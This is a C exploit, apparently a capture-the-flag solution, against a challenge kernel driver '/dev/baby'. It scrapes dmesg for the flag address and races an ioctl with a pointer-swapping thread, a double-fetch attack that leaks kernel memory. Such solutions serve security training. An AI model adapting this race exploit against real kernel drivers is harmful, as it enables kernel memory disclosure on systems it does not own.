#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pthread.h>


size_t flag_addr;
int Time = 1000;
int finish = 1;

typedef struct
{
	char *flag;
	size_t len;
}Data;

void change_flag_addr(void *s)
{
	Data *data = (Data*)s;
	while(finish)
		data->flag = (char*)flag_addr;
}

int main()
{
	pthread_t t1;
	int fd = open("/dev/baby",O_RDWR);
	ioctl(fd, 0x6666);
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 2);
	
	char buf[1024], *flag_addr_addr;
	
	/*int fd_addr, id;
	system("dmesg | grep flag > /tmp/fxc.txt");
	fd_addr = open("/tmp/FXC.txt", 0);
	id = read(fd_addr, buf, 0x100);
	close(fd_addr);
	*/

	FILE *info = popen("dmesg","r");
	fseek(info, -0x100, SEEK_END);
	while(fgets(buf, sizeof(buf), info) != NULL)
	{
		if((flag_addr_addr = strstr(buf, "Your flag is at ")))
		{
			flag_addr_addr += strlen("Your flag is at ");
			flag_addr = strtoull(flag_addr_addr, (char*)(flag_addr_addr+16), 16);
		}
	}
	pclose(info);
	printf("[+] find flag addr: 0x%lx\n", flag_addr);
	
	Data data;
	data.flag = buf;
	data.len = 33;
	
	pthread_create(&t1, NULL, change_flag_addr, &data);
	
	for(int i=0; i<Time; i++)
	{
		ioctl(fd, 0x1337, &data);
		data.flag = buf;
	}
	finish = 0;
	
	pthread_join(t1, NULL);
	close(fd);
	
	puts("[*] the result is:");
	system("dmesg | grep flag");
	return 0;
}
